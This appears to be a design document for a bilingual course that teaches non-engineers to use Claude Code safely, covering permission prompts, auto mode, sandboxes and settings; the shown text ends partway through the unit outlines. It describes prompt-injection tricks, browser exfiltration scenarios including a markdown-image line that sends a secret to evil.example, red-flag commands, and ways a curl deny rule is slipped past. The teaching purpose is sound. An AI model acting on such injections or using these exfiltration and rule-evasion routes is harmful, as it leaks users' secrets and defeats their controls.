# Claude Code 101: design

A web course that teaches non-engineers how Claude Code works behind the scenes, so they can use it with MCP servers, browsers, and local tools without leaking their secrets, wiping their data, or getting hijacked by prompt injection. It's built as a game: short Learn cards, then many hands-on simulations.

Status: **revision 2, approved by the owner on 2026-10-21.** Revision 1 was approved and built on 2026-10-21 (merged to `main` as TETRA2000/claude-code-101#1). Revision 2 replaces it as the design and **extends the built app; it doesn't start over**. Next step after approval: a new implementation plan for the revision 2 work.

## Current state (what's already built)

As of `main` at the time of writing:

- **App:** Vite + React + TypeScript, with Vitest (269 tests) and Playwright e2e on desktop and phone widths, run in GitHub Actions CI. There's also a Vercel deploy. The quiz engine, progress storage, language switch, and content validator are all built.
- **Content:** units 1–5 are ready, with 5 Learn cards each and 8–12 practice items (`content/units/{computer,agent,permissions,injection,browser}.json`). Units 6–11 from revision 1 are "Coming soon" cards in `content/course.json`.
- **Facts sheet:** `docs/claude-code-facts.md` has sections F1–F10 (terminal and desktop prompts, what asks by default, permission modes, "don't ask again", memory, tools, browser control, MCP naming, sandbox), each with sources, a checked date, and `UNVERIFIED` notes.
- **Unit 3 already teaches** that terminal sessions start in auto mode, to switch to Manual while learning, and that auto mode still allows things like reading `.env` and sending keys to their matching service. Revision 2 keeps this and builds unit 12 on it.
- **Practice types built:** Approve or deny, Decode, Predict, Match pairs, Order the loop, Find the hidden order, Stop the chain, Break the combo, Pick the setup. Demos built: terminal playground, color the context, prompt anatomy.
- **Repo rules** live in `CLAUDE.md`. Revision 2 changes four of them (see "Changes to the repo rules" below).

Revision 2 is therefore mostly **new and deeper content plus a few new components**: new card kinds, new practice types, new demos, doc links, and renumbered units. The engine stays.

## What changed in revision 2

The owner reviewed revision 1 and said the concept is right, but the descriptions and units are too simple compared with the official Claude Code docs. In order of importance, the owner asked for:

1. **More depth** in every unit, drawn from the official docs.
2. **More topics** the docs cover and the course skipped: hooks, skills, plugins, subagents, and settings.
3. **Links to the official docs** for further learning.
4. **Safety stays the focus, with practical how-to added.** Learners also practice doing the safe thing themselves.

I read the official docs on 2026-10-21 (pages listed under each unit). Three findings shaped the design:

- **Auto mode is now where new terminal sessions start.** Since Claude Code v2.1.283, new terminal and VS Code sessions start in auto mode on every plan. In auto mode, a separate model reviews actions instead of asking you, so a new user rarely sees a permission prompt. The mode that asks every time is now called **Manual** (`default` in config). The built unit 3 already mentions this in a few cards. The owner decided: **tell learners to switch to Manual while they learn, and also teach them to use auto mode safely**, which gets its own unit (12).
- **Deny rules match the command as written; they aren't a wall.** `Bash(curl *)` doesn't stop `/usr/bin/curl` or `sh -c 'curl …'`. The docs point to the sandbox for real limits, and the sandbox is off by default.
- **A cloned repository can do more before you trust it than people assume.** Its hooks run if you trusted a parent folder, and a project skill's `allowed-tools` is never checked against trust. This feeds units 8, 9, and 11.

The owner chose **approach B** (below): two waves in one plan. Wave 1 ships seven units, and wave 2 adds the rest.

## Why this exists

The learners are people with **no programming or UNIX background** who have never used Claude Code and want to get better at it. Their goal is to build interactive web pages by connecting Claude Code to a lot of tools: MCP servers like Notion and Figma, and local tools like Node.js and Playwright.

That gives them a lot of power with no way to read what the agent is about to do. The course's main job is **not** to teach them to build pages. It's to make them understand what Claude Code is doing behind the scenes, so they can:

- read a permission prompt and tell a routine command from a dangerous one,
- recognize prompt injection, wherever it hides,
- understand the "deadly combo" (private data + untrusted content + a way out) and break it, especially when the agent drives a browser,
- choose safe setups (browser profiles, permission modes, rules, sandboxes) instead of turning safety off,
- **do the safe thing themselves** (owner's addition in revision 2): switch modes, find and remove a saved rule, check what an MCP server or plugin adds, turn on the sandbox, and write a deny rule or a simple blocking hook,
- **use auto mode safely** once they understand what it checks and what it doesn't.

Prior art the owner pointed to:

- **cascade-learn** (https://github.com/TETRA2000/cascade-learn), the owner's earlier Duolingo-style course app: units, Learn cards with playgrounds you can safely break, practice quizzes with hearts and XP, missed questions coming back at the end, and JSON content. This course reuses its structure and look.
- **"Continue? Y/N"** (https://llmgame.scalex.dev/), a 60-second game in a fake Claude Code terminal. Commands stream in with plausible explanations, you press Y or N, and approving a dangerous one shows a fake BREAKING headline. The recap lists what you allowed and denied, each with a one-line lesson. It works because the harmless commands train you to keep pressing Y. The owner wants **lots of interactive tutorials in this style**.
- **The official Claude Code docs** (https://code.claude.com/docs), new in revision 2. They set the depth bar and are the target of every "Learn more" link. Their own interactive pages (for example "Explore the context window") show the kind of clickable explanation this course should match.

## Goals

1. A standalone web app in this repo (`claude-code-101`). It is not a course inside cascade-learn.
2. Every lesson in **English and Japanese**, with a language switch.
3. Mostly practice, not reading. Each unit has a few Learn cards, then many scripted simulations where the learner makes the call and sees what happens.
4. **Depth that matches the official docs.** Every unit covers the real names, settings, files, and behaviors the docs describe, in plain words, broken into one idea per card. Depth goes in more cards and more practice items, not longer text.
5. **Further learning built in.** Each Learn card can end with one "Learn more" link to the exact official page section. Each unit has an "Official docs" list. Links open the Japanese docs when Japanese is selected (see Links to the official docs).
6. **Practical how-to.** Each unit that has a hands-on safety step includes at least one "Try it" card: the exact steps in the terminal and in the desktop app, plus how to check it worked.
7. **Wave 1 ships seven complete units** (1–5, 11, and 12). **Wave 2 completes units 6–10 and the boss.** Both waves are in one plan. The site works and can ship after wave 1, and wave 2 units turn on one at a time as they're finished. The course map always shows every unit. Unfinished ones appear as "Coming soon" cards with a title, a one-line description, and what you'll practice. (Owner's requirement from revision 1, kept.)
8. Every claim about Claude Code is accurate as of the date it was checked, and records the Claude Code version it was checked against.

## Non-goals

- Teaching people to build web pages.
- General productivity features with no safety angle: code review, scheduled tasks, Slack, CI pipelines, agent teams, the Agent SDK. They may show up as one-line mentions or in "Learn more" lists, but get no cards of their own.
- Organization administration (managed settings, MDM, admin consoles). It's mentioned where it explains why something is locked ("your organization set this"), but not taught.
- Accounts, sync, a backend, leaderboards, or analytics. Progress stays in the browser.
- Any real AI, real command execution, or real network calls. Every simulation is scripted and fake.
- Copying the docs. The course explains and links; it never reproduces pages.
- Making the site easy to find (SEO, social sharing). The owner doesn't care about this for now.

## Anti-goals: failures even if it technically works

These weren't stated by the owner and are my calls. Please check them.

- **Scaring people off Claude Code.** The message is "read before you approve, and set things up safely," not "never let the agent do anything." Practice must include plenty of harmless commands where **No is the wrong answer**. Treating every request as dangerous is just permission fatigue in reverse. The same goes for auto mode: the course teaches how to use it well, not that it's bad.
- **Being wrong about Claude Code.** A security course with wrong facts is worse than none. Claude Code changes weekly, so wrong-because-outdated counts too.
- **Becoming an attack cookbook.** Examples show the *shape* of an attack. Nothing should work as a real attack if copied (see Content safety).
- **Reading like documentation.** More depth must not mean walls of text. If an idea can be clicked, it should be. If a card needs more than about 80 words of English, it should be two cards or a demo.
- **Unexplained jargon.** Every term (path, flag, token, MCP, context window, classifier, scope, hook) is explained in plain words the first time it appears, in both languages.
- **A false sense of safety.** The course must never imply that one setting makes you safe. Every safeguard is taught with what it doesn't cover: deny rules vs. other ways to write the command, the sandbox vs. MCP servers and hooks, auto mode vs. what it allows by default.

## Who it's for, concretely

A non-engineer on a laptop, likely with Claude Code open in another window later. Design for laptop first, but every screen must also work at phone width.

**Which Claude Code they use (owner's decision):** the **Claude Code desktop app** and the **terminal (CLI)**. Simulations are drawn in both:
- Each simulation item says which app it shows.
- Practice mixes the two.
- The prompt-anatomy Learn card shows the same request in both apps side by side.
- "Try it" cards give steps for both apps.

The VS Code extension isn't simulated. Claude Code in the cloud (claude.ai/code) appears in unit 10 as an isolation option, and the Chrome extension and the desktop app's built-in browser both appear in unit 5.

**Permission modes, as of 2026-10-21** (to be re-verified when written; see Accuracy):
- Terminal: new interactive sessions start in **auto mode** (v2.1.283+). `Shift+Tab` cycles modes. From auto, the first press goes to Manual (status bar `⏸ manual mode on`), then Accept edits, then Plan, then back to auto. `"defaultMode": "manual"` in `~/.claude/settings.json` makes new sessions start in Manual.
- Desktop app: a mode selector sits in the row under the prompt box (Manual, Accept edits, Plan, Auto, and Bypass permissions if enabled). The choice is remembered per folder. **The docs don't say which mode a new desktop session starts in.** The builder must find out and record it in the facts sheet.
- **The course's advice (owner's decision):** switch to **Manual** while learning. Unit 3 teaches how. Unit 12 teaches when and how to use auto mode safely. Bypass permissions is always marked wrong in "Pick the setup" unless the setup is an isolated container or VM, and only in unit 10 or later.

## Approaches considered

The owner asked for more depth and more topics in the first release, "if you can." I laid out three ways:

| | Approach | Trade-off |
|---|---|---|
| A | All 13 units fully built in the first release | Whole path on day one, but about 2.5× the content and ~8 new practice types. It's the slowest to ship and has the most claims to keep accurate against fast-moving docs. |
| **B** | **Two waves in one plan. Wave 1: units 1–5 deepened, plus 11 Locking it down and 12 Auto mode, safely. Wave 2: units 6–10 and the boss.** | Covers the risks that matter now first (auto mode is the default, and the how-to lives in settings, rules, and hooks), and every unit keeps the same depth. Units 6–10 stay "Coming soon" for a while, and unit 12 points to sandboxes before unit 10 exists, so unit 12 carries its own short sandbox explainer. |
| C | Keep five units and fold the new topics into them | Smallest change, but it crams the how-to into already-full units and works against the "too simple" feedback. |

**The owner picked B.**

## The course map

The map is in suggested learning order. Wave 1 units are ready first, so the map has gaps between unit 5 and unit 11 until wave 2 lands. That's fine because nothing is locked (my call: learning order matters more than a gap-free map).

| # | Unit | Wave | Covers |
|---|---|---|---|
| 1 | Your computer, from the inside | 1 | Terminal, files and folders, paths, `~`, hidden dot-files, where secrets live, what `rm` and `>` really do, and where Claude Code keeps its own files (`~/.claude`, `.claude/`) |
| 2 | How Claude Code works | 1 | The agent loop, tool categories, Claude runs as you, the context window and what fills it, compaction, CLAUDE.md vs. auto memory, sessions saved on disk, what undo (checkpoints) can and can't reverse, extensions at a glance |
| 3 | Permission prompts | 1 | Reading a prompt; the four answers; what "don't ask again" saves and where; read-only commands that never ask; permission modes and **switching to Manual**; `/permissions` to see and remove rules; protected files; red flags; permission fatigue; workspace trust |
| 4 | Prompt injection | 1 | Where injections hide, invisible text, warning signs, what each tool actually passes to Claude (web fetch summaries vs. raw pages vs. MCP results), persistence via CLAUDE.md and auto memory, what Claude Code itself does about injection, and what to do |
| 5 | Browser automation | 1 | Chrome extension (your logins) vs. the desktop app's built-in browser (clean profile), site permissions, the deadly combo, how data leaves through a browser, uploads, screenshots and GIFs, computer use, safe setups |
| 6 | Who can do what | 2 | Users, file permissions (`rwx`), `sudo`, environment variables. Claude runs with *your* powers |
| 7 | MCP servers | 2 | Local vs. remote servers, the three install scopes, adding, listing and removing servers, `.mcp.json` approval, logins and tokens, claude.ai connectors, poisoned tool descriptions, servers that change after approval, cross-server injection |
| 8 | Skills, plugins and subagents | 2 | **New.** Skills and plugins are code you install. What each can run, `allowed-tools`, `` !`cmd` `` in skills, plugin hooks and MCP servers, marketplaces and auto-update, reviewing before you install, subagents and what they inherit |
| 9 | Installing code safely | 2 | Lookalike and made-up packages, install scripts, `curl \| sh`, `npx -y`, booby-trapped projects (`.claude/settings.json` hooks, `.mcp.json`, skills, `.claude/agents/`), what runs before you trust a folder |
| 10 | Sandboxes | 2 | The built-in sandbox (`/sandbox`), what it isolates and what runs outside it, network allowlists, protecting credential files, the unsandboxed-retry escape hatch, risky openings (broad domains, Docker socket, `localhost`), whole-process isolation (sandbox runtime, dev containers, VMs, Docker Sandboxes, cloud sessions) |
| 11 | Locking it down | 1 | Settings files and which one wins, rule syntax, deny → ask → allow, what a Bash rule doesn't match, protecting `.env` and secrets, hooks that block, a starter safe setup |
| 12 | Auto mode, safely | 1 | **New.** What the classifier is and what it sees, what it blocks and allows by default, boundaries you state in chat, how to clear a block, `ask` rules as hard checkpoints, the Recently denied tab, when auto mode falls back, why a sandbox still matters |
| 13 | Boss: Continue? Y/N | 2 | 60 seconds, ~20 prompts, mostly harmless. Can you keep reading? Recap with headlines |

The owner's topic list maps onto this: "basic UNIX commands and its security model" is units 1 and 6; "basic Claude Code security model" is units 2–3; "advanced" is units 10–12; "MCP servers and their risks" is unit 7 (MCP also appears in units 2, 4 and 5). Revision 2 adds unit 8 (extensions) and unit 12 (auto mode).

Each "Coming soon" card needs its title, a one-line description, and its practice-type chips, in both languages. The full outlines below exist so the cards and later work agree.

## How a unit works

Same loop as cascade-learn, sized up for depth (my call on the new counts):

- **Learn first:** 4–7 Learn cards, each one idea. Most have a small interactive demo (a playground you can safely break). Units with a hands-on step include at least one **Try it** card.
- **Then practice:** 10–14 simulations mixing that unit's practice types, roughly easy to hard.
- **5 hearts per practice run.** A wrong answer costs a heart and comes back at the end. **XP** for first-try answers, less on retry. Running out of hearts ends the run with "try again".
- **Every answer teaches.** Feedback always explains why, right or wrong. Each wrong *option* has its own consequence text, not one generic "wrong". Where it helps, feedback ends with a "Learn more" link to the doc section that backs it.
- **Dangerous approvals end with a fake BREAKING headline** (llmgame's device), followed by a plain-language explanation and what to say to Claude instead.
- **An "Official docs" list** on each unit's page: 3–8 links to the pages the unit is based on, each with a one-line "read this if…" note.
- Progress (completed cards, practice runs, XP, language) is saved in `localStorage`.
- **No locking** (my call). Any ready unit can be opened at any time. The map shows the suggested order and marks the next suggested **ready** unit. Practice isn't gated behind Learn cards either. Padlocks appear only on "Coming soon" units.

### Learn card kinds

- **Idea card:** one concept, short text, usually a demo.
- **Try it card** (new): a how-to with tabs for **Terminal** and **Desktop app**. It gives numbered steps (what to type or click), what you should see, and "check it worked." It only ever shows safe actions: switching modes, opening `/permissions`, `/memory`, `/context`, `/mcp`, `/sandbox`, `/status`, editing a settings file to add a deny rule. Safe snippets (settings JSON, slash commands) may have a copy button. Dangerous commands never do.
- **Under the hood card** (optional): a "how it actually works" note for curious learners, collapsed by default, so depth is there without forcing it on everyone.

## Links to the official docs

New in revision 2. My calls throughout; please check them.

- **Where links appear:** at most one "Learn more" link per Learn card (at the bottom), an optional link in practice feedback, and the unit's "Official docs" list.
- **Allowed destinations:** `code.claude.com/docs/…` first. Also allowed: `support.claude.com`, `claude.com/blog`, `www.anthropic.com/engineering`, `trust.anthropic.com`, and `github.com/anthropics/…`, for the few topics the docs link out to (auto mode deep dive, Chrome extension help, sandbox runtime). Nothing else. The content validator checks this.
- **Language:** content stores a doc **slug and optional anchor** (for example `permissions#manage-permissions`), not full URLs. The site builds `https://code.claude.com/docs/en/<slug>` or `…/docs/ja/<slug>` from the current language. On 2026-10-21, every slug this document lists returned a real page in both English and Japanese (for example, `/docs/ja/permissions` is titled 「権限を設定する」), and an unknown slug returned 404. The builder still checks each link when authoring. A page without a Japanese version links to English with a small "English" label. Non-docs links are stored as full URLs and labeled with their language.
- **Anchors** may break when docs are rewritten. Each link is checked at authoring time. Content records `linksChecked: YYYY-MM-DD` per unit, which the site doesn't show. A missing anchor degrades to the top of the page, which is acceptable.
- **No live fetching.** Links are plain links that open in a new tab. The site still makes no network requests of its own.
- Links open in a new tab, with an icon and screen-reader text saying so.

## Practice types

Simulations are drawn as realistic-but-generic environments: a Claude Code-style terminal, the desktop app, a browser window, a notes page, a design-tool layer list, a settings file. Third-party products (Notion, Figma, Gmail, banks) are shown as **generic look-alikes**, never branded copies (my call). The Claude Code terminal and desktop app are shown as Claude Code, since that's the subject.

**Wave 1 types:**

| Type | What the learner does | Correct when | Units |
|---|---|---|---|
| **Approve or deny** | Sees the task they gave Claude, Claude's narration, and a permission prompt (tool, command or target, Claude's stated reason) drawn as the desktop app or the terminal. Picks one of the options the real prompt offers (see grading). Optional "Decode the command" hint costs XP. | Their choice is in the item's set of accepted answers | 3, 4, 5, 11, 12 |
| **Decode the command** | Matches each piece of a command (`curl`, `-d @.env`, `\|`, `~`, `sudo`, `rm -rf`) to what it does. | All pieces matched. No hearts. | 1, 3 |
| **Predict** | Reads a command and a described situation, then picks what happens or what's printed. | Picked = answer | 1, 2 |
| **Match pairs** | Vocabulary: term ↔ meaning, tool ↔ what it can do, path ↔ what's inside, file ↔ who it affects. | All matched. No hearts. | 1, 2, 11 |
| **Order the loop** | Puts the steps of an agent run in order. | Order matches | 2 |
| **Find the hidden order** | Reads a document (notes page, web page, layer list, README, issue comment, email, image alt text). Toggles "As you see it" / "As Claude sees it" (hidden text, HTML comments and alt text show up in the second). Taps the line(s) aimed at the AI. | Selected line(s) = answer | 4, 5 |
| **Stop the chain** | Sees the task and an environment panel, plus Claude's numbered tool calls with stated reasons. Taps the **first** step that should have been denied. | First wrong step picked. Feedback differs for "too early" and "too late" | 4, 5 |
| **Break the combo** | Sees an attack scenario with its three ingredients. Picks the change that stops it, from a list where some changes don't remove any ingredient. | Chosen change removes an ingredient | 5 |
| **Pick the setup** | Given a task, chooses a setup: browser, mode, rule, or sandbox option. | Picked = answer | 3, 5, 11, 12 |
| **Build the rule** (moved up from later) | Assembles a permission rule from parts (`allow`/`ask`/`deny`, tool, pattern) to meet a goal, then sees which test commands it matches and which slip past. | The rule meets the goal on every test command | 11 |
| **Fix the settings** (moved up from later) | Reads a settings file (and in wave 2, `.mcp.json`, a skill, or a plugin's `hooks.json`) and taps the dangerous or wrong line. | Tapped line(s) = answer | 11 (wave 2: 8, 9) |
| **Which file wins?** (new) | Sees the same key in two or more settings files (user, project, local, managed, `--settings`) and picks the value that applies, or whether a deny elsewhere blocks it. | Picked = answer | 11 |
| **Would auto mode stop this?** (new) | Sees a request, an action Claude wants to take, and the session's setup (rules, sandbox, anything said in chat). Picks **Runs**, **Blocked by auto mode**, or **Still asks you**. | Picked = answer, with feedback naming the reason (the default rule, an ask rule, a protected path, a critical-path removal, a boundary you stated) | 12 |

**Grading Approve or deny** (my calls, extended for the four-option prompt):
- **The options shown match the real prompt for that tool and mode.** A Bash prompt in Manual mode can show: Yes / Yes, and don't ask again for: `<rule>` / Yes, and switch to auto mode / No. Some prompts offer only a one-time Yes, and items reflect that. Desktop items use the desktop app's options. Website actions in the desktop app's built-in browser show Allow once / Always allow / Deny.
- **Dangerous request:** only No is accepted. Any Yes costs a heart and shows the BREAKING headline. "Don't ask again" adds a line saying future requests like it won't be asked about. "Switch to auto mode" adds a line on what changes from then on.
- **Harmless request whose saved rule would be narrow and safe** (e.g. `npm run build`): Yes and "don't ask again" are both accepted.
- **Harmless request whose saved rule would be broad** (e.g. it would allow every `curl`): only Yes is accepted. "Don't ask again" costs a heart and explains what the rule would let through later. No BREAKING headline.
- **"Yes, and switch to auto mode" in units 3–5:** not accepted, even on harmless requests. It costs a heart, with gentle feedback: the command itself was fine, but the course asks you to stay in Manual while learning, and here is what switching would change. **In units 11–12** it can be accepted when the item's setup has the safeguards unit 12 teaches.
- **No on a harmless request:** costs a heart, with gentle feedback explaining why it was safe and that blocking routine work is its own trap.
- Every option on every item has its own feedback text.

**Learn-card demos needed in wave 1:**
- a terminal playground (click scripted commands, see annotated output, with hidden files and fake secrets showing up);
- a "color the context" view (the context window as a stack of text, colored by who wrote each piece);
- a labeled anatomy of a permission prompt, in both apps;
- a **mode switcher** that mirrors the terminal status bar and the desktop selector, showing what runs without asking in each mode;
- a **rule tester** (type a rule, see which sample commands it matches and which slip past);
- a **settings stack** (click a settings file, see who it affects and which value wins).

Others are up to the builder.

**Wave 2 types:** Read the scopes (MCP install and login screens), Spot the poisoned tool, Review before install (read a plugin's "Will install" list and its `hooks.json`), Real or fake package, Inside or outside? (what the sandbox covers), Will it get out? / Trim the list (network allowlists), and the timed boss version of Approve or deny with a recap screen.

## Unit outlines

Topic lists for authors. Every fact below was read in the official docs on 2026-10-21 and **must be re-checked when written** (see Accuracy). Version numbers are noted where the docs give them. "Docs" lists the pages each unit relies on and links to (slugs under `code.claude.com/docs/<lang>/`).

### 1. Your computer, from the inside (wave 1)

- What a terminal is and why Claude Code uses one: it can run any command you could.
- Files, folders, paths; `~` is your home folder; relative vs. full paths.
- Hidden dot-files: `ls` vs. `ls -a`.
- Where secrets live: `.env`, `~/.ssh`, `~/.aws`, shell profiles like `~/.zshrc`, tool login files, browser profiles.
- The terminal has no trash can: `rm`, `rm -rf`, and `>` overwriting a file.
- **Where Claude Code keeps its own files:** `~/.claude/` (your settings, skills, memory, and every conversation saved as a plain-text file under `~/.claude/projects/`), `~/.claude.json` (sign-in, MCP servers, trust decisions), and the project's own `.claude/` folder (shared settings, skills, agents). The point: your conversations, including any secrets pasted into them, sit on disk in plain text.
- Practice: Predict (`ls` vs. `ls -a`), Decode (`cd`, `ls`, `cat`, `rm -rf`, `>`, `|`, `curl`), Match pairs (path ↔ what's inside, including `~/.claude/projects`).
- Docs: `claude-directory`, `how-claude-code-works#work-with-sessions`.

### 2. How Claude Code works (wave 1)

- The agentic loop in the docs' words: **gather context → take action → verify results**, repeated. You can interrupt at any time: `Esc` stops, and a typed message is read after the current tool calls.
- Claude Code is the "harness" around the model: it supplies the tools and manages what the model sees.
- Tool categories: file operations, search, execution (shell), web (search and fetch), code intelligence, plus subagents and MCP tools.
- **Claude runs as you.** Commands can do anything you can do in a terminal.
- The context window holds the conversation, file contents, command output, CLAUDE.md, auto memory, loaded skills, and system instructions. Strangers' text (web pages, tool results) lands next to your words. `/context` shows what's using space.
- **Compaction:** when the window fills, Claude Code clears old tool output and then summarizes, and early instructions can be lost. Lasting rules belong in CLAUDE.md.
- **CLAUDE.md vs. auto memory:** you write CLAUDE.md (project, user, or organization). Claude writes auto memory (`~/.claude/projects/<project>/memory/`; the first 200 lines or 25KB load each session). Both are context, not enforcement: "permission rules are enforced by Claude Code, not by the model." `/memory` shows and edits both and turns auto memory off. `/init` starts a CLAUDE.md.
- Sessions are saved locally, and `--continue` or `--resume` reopens one. Each new session starts with a fresh context.
- **Undo has limits:** before editing a file, Claude Code snapshots it. `Esc` twice (or asking Claude) rewinds. Checkpoints cover file edits only. Anything that reached the outside world (a sent message, a deployed site, a database change, an API call) can't be undone.
- Extensions at a glance, each with one line and a pointer to its unit: MCP (7), skills, plugins and subagents (8), hooks (11).
- Claude can be confidently wrong ("I removed the secret"): check the result, not the summary.
- Practice: Color the context, Order the loop, Match pairs (tool ↔ power; feature ↔ "who writes it / is it enforced?"), Predict ("what can Claude see right now?", "can this be undone?").
- Docs: `how-claude-code-works`, `context-window`, `memory`, `features-overview`, `checkpointing`, `sessions`.

### 3. Permission prompts (wave 1)

- **Anatomy of a prompt** in both apps: tool, the exact command or target, Claude's stated reason, the options. In the terminal, `Esc` cancels and `Tab` adds a note to your Yes or No (a No with a note tells Claude why and lets it keep working).
- **The four answers** (Bash prompt, Manual mode): Yes / Yes, and don't ask again for: `<rule>` / Yes, and switch to auto mode / No. Some prompts offer only a one-time Yes.
- **What "don't ask again" saves:** a lasting rule in `.claude/settings.local.json` at the repository root, for Bash commands and web-fetch domains. It applies in later sessions too. File-edit approvals last only until the session ends. Approving `git status && npm test` saves a rule for each part that needed approval.
- **What never asks:** reading files inside the working folder, and a built-in set of read-only commands (`ls`, `cat`, `echo`, `pwd`, `head`, `tail`, `grep`, `find`, `wc`, `which`, `diff`, `stat`, `du`, `cd`, read-only `git`). Exceptions still ask, such as `ps` options that print environment variables and commands Claude Code can't fully parse.
- **The working folder is a prompt, not a wall:** Claude's file tools ask before reading or writing outside it, but an approved shell command can write anywhere you can.
- **Permission modes:** Manual, Accept edits, Plan, Auto, plus Don't ask and Bypass permissions, each in one line with what runs without asking. **Try it: switch to Manual** (`Shift+Tab` until `⏸ manual mode on`; or set `"defaultMode": "manual"`; or the desktop mode selector).
- **Try it: see and remove your saved rules** with `/permissions`, which lists every rule and the file it came from.
- **Protected files and folders** are never approved automatically outside Bypass permissions: `.git`, `.claude`, `.vscode`, shell profiles (`.bashrc`, `.zshrc`, `.profile`, …), `.npmrc`, `.gitconfig`, `.mcp.json`, and others. **Critical paths:** an `rm` of `/`, your home folder, or your working folder can never be pre-approved by any rule.
- **Workspace trust:** opening a folder for the first time shows a trust dialog listing what the folder's settings would allow. Starting Claude Code in your home folder means trust is never saved. Start in a project folder instead. (Unit 9 goes deeper.)
- **Read the target, not the reason.** Claude's explanation can sound fine while the command isn't.
- **Red flags:** paths outside the project (`~`, `/`), sending files (`curl -d @file`, uploads), piping downloads into a shell, `rm -rf`, `sudo`, `chmod 777`, global installs, editing shell profiles, force-pushing, anything touching `.claude/` or `.mcp.json`.
- Permission fatigue, and why "don't ask again" on a broad rule is how it bites.
- Practice: mostly Approve or deny (**roughly 60% harmless**), plus Decode and Pick the setup (which mode for this task while learning).
- Docs: `permissions`, `permission-modes`, `permission-modes#protected-paths`, `security`, `desktop#choose-a-permission-mode`.

### 4. Prompt injection (wave 1)

- What it is: text written by someone else that tries to give Claude orders.
- **Where it hides:** web pages, notes and docs pages, design-tool layer names, READMEs, issue comments, emails, package docs, image alt text, tool and MCP output, subagent reports.
- **Invisible tricks:** white text, HTML comments, alt text, tiny text.
- **What each tool passes to Claude** (new): for most web fetches, a separate model reads the page and Claude gets that model's answer, not the raw page. That helps, but it's not a guarantee. A browser tool (unit 5) and MCP tools hand Claude the page or result itself, hidden text included. Items say which tool brought the text in.
- **Warning signs:** it addresses the AI, claims authority or pre-approval ("this is pre-approved"), says "don't tell the user", or asks to move data or run something unrelated to the task.
- **Persistence:** injected text that gets written into CLAUDE.md or auto memory affects every later session. **Try it:** open `/memory` and read what's saved.
- **What Claude Code does about it** (from the Security page): permission prompts in Manual mode, `curl` and `wget` never auto-approved, web-fetch summaries, trust prompts for new folders and project MCP servers, asking about commands it can't fully analyze, scanning subagent reports for instruction-like text. Also what it can't promise: "no system is completely immune."
- **What to do:** stop (`Esc`), ask Claude what it read and why, don't approve steps outside the task, report with `/feedback`.
- Practice: Find the hidden order (several sources), Stop the chain (terminal), Approve or deny where the request came from an injection.
- Docs: `security#protect-against-prompt-injection`, `tools-reference#webfetch-tool-behavior`, `memory`, `mcp` (security warning).

### 5. Browser automation (wave 1)

- **Two browsers, two stories** (from the docs):
  - **Claude in Chrome** (terminal, with `claude --chrome` or `/chrome`): an extension in your real Chrome or Edge. It **shares your browser's login state, so it can reach any site you're signed into**. It works in a visible window in a tab group. It pauses for login pages and CAPTCHAs. Which sites it may use comes from the extension's site permissions. A cloned project can't turn it on.
  - **The desktop app's built-in browser** (Browser pane): "a clean browser profile, separate from your personal browser, with none of your saved logins or history." Safety classifiers review clicks and typing on outside pages in every mode, and "Claude won't purchase items, create accounts, or bypass CAPTCHAs without your input." The first action on each site asks: Allow once / Always allow / Deny. "Always allow" can be revoked in Settings.
- Your everyday browser profile is your whole online life: logged-in sessions, cookies, saved passwords.
- **The deadly combo.** Scenarios the owner asked for:
  - **Primary-browser takeover:** an injected page sends the agent to your mail and out through a URL.
  - **Cookie and token dump** through in-page scripts.
  - **Form upload trap:** the agent uploads `~/.ssh/id_rsa` or `.env`. Note: recent Claude in Chrome refuses files under `.ssh`, `.env`, `.pem`, and `.key` (v2.1.293+). Teach the general lesson ("uploads send your files away") with files the guard doesn't cover, like a customer spreadsheet or a config file, and mention the guard as a backstop that only knows certain names.
  - **Network log leak:** login tokens in captured request headers.
  - **Clicking yes as you:** OAuth consent, purchases, deletes.
  - **Screenshot spill,** and **recorded GIFs** that capture account details on logged-in pages.
  - **Hidden text** on pages.
  - **Markdown-image exfiltration** (`![](https://evil.example/?q=SECRET)`).
- **Computer use** (one card): Claude can also control apps on your real screen. In the desktop app it's off by default, each app needs approval for the session, and access tiers are fixed (browsers view-only, terminals and editors click-only, everything else full control).
- **Safe setups:** prefer the desktop app's built-in browser or a separate Chrome profile with no logins; limit sites in the extension's permissions; approve each new site; log in only to test accounts; turn browser tools on only when needed.
- Practice: Stop the chain (browser), Break the combo, Pick the setup (which browser for this task), Find the hidden order (web pages), Approve or deny for browser actions (both apps' prompts).
- Docs: `chrome`, `desktop` (Browser pane, computer use), `computer-use`, `security`. Support article: "Getting started with Claude in Chrome".

### 6. Who can do what (wave 2)

Users and accounts, file permissions (`rwx`, `ls -l`), `sudo` and why Claude Code refuses Bypass permissions as root, environment variables and how secrets ride along in them (a sandboxed command inherits them unless you remove them), `chmod 777`. Claude runs with *your* powers. Practice: Decode, Predict, Match pairs. Docs: `security`, `sandboxing#protect-credentials`, `env-vars`.

### 7. MCP servers (wave 2)

Local (stdio) servers run as programs on your machine, and remote (HTTP) servers are websites with logins. The three install scopes: local (default, `~/.claude.json`), project (`.mcp.json`, shared through git), and user (all your projects). **Try it:** `claude mcp add`, `claude mcp list`, `claude mcp remove`, `/mcp` (status, log in, disable). OAuth logins: "Clear authentication" revokes access, and removing a server deletes its tokens. A project's `.mcp.json` servers ask before connecting in interactive sessions, but not in `-p` runs. `claude mcp reset-project-choices` resets your answers. claude.ai connectors appear in Claude Code when you're signed in. Output limits (warning at 10,000 tokens, default cap 25,000). Plus the revision-1 risks: poisoned tool descriptions, servers that change after approval, and cross-server injection. Anthropic reviews directory listings but "does not security-audit or manage any MCP server." Practice: Read the scopes, Spot the poisoned tool, Approve or deny for MCP tool calls. Docs: `mcp`, `mcp-quickstart`, `security#mcp-security`.

### 8. Skills, plugins and subagents (wave 2, new)

- **Skills** are `SKILL.md` instruction files (personal `~/.claude/skills/`, project `.claude/skills/`, plugin). They load when their description matches or when you type `/name`. A skill can **pre-approve tools** with `allowed-tools`, run shell commands **before Claude sees it** with `` !`cmd` ``, and register hooks. A project skill's `allowed-tools` applies even in a folder you haven't trusted. `disable-model-invocation: true` keeps a skill with side effects manual-only.
- **Plugins** bundle skills, agents, hooks, MCP servers, and more. "A Claude Code plugin you install can execute arbitrary code on your machine with your user privileges." Hooks, monitors, and plugin servers run outside the sandbox. **Auto-update** can change files you already reviewed (on by default for Anthropic's official marketplaces, off for others). Official marketplace names are reserved for `github.com/anthropics/` sources, so a lookalike can't claim them. A marketplace's name says who publishes the catalog, not what each plugin does.
- **Try it: review before you install:** `/plugin` → the plugin's details → read **Will install**, then its `hooks/hooks.json`, `.mcp.json`, and `bin/`. Pick the narrowest scope. `claude plugin details <name>` after install. Uninstall, and remove the marketplace if you don't trust its owner.
